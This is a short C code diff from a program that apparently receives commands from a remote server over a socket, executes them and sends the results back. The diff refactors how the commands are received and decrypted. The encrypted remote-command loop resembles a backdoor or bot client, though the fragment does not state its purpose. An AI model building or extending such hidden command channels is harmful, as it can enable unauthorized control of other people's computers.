@@ -40,7 +40,7 @@ int connection_initialize() {
 	return TRUE;
 }
 
-char* pop_data(char *data, unsigned int len) {
+char* pop_data(unsigned int len) {
 
 	char dt[len];
 
@@ -112,10 +112,7 @@ int main() {
 
 	while(TRUE) {
 
-		char command[4096];
-		recv(sock, command, 4096, 0);
-
-		char* rcommand = crypt(command, encryption_key, 4096, KEY_LEN);
+		char *rcommand = pop_data(4096);
 
 		unsigned int commands_done = 0;
 
@@ -136,7 +133,6 @@ int main() {
 		if(commands_done == 0)
 			execute_command((const char*)rcommand, result);
 
-	//	crypt(result, encryption_key, strlen(result), KEY_LEN);
 		send_data(result, strlen(result), TRUE);
 
 		free(rcommand);
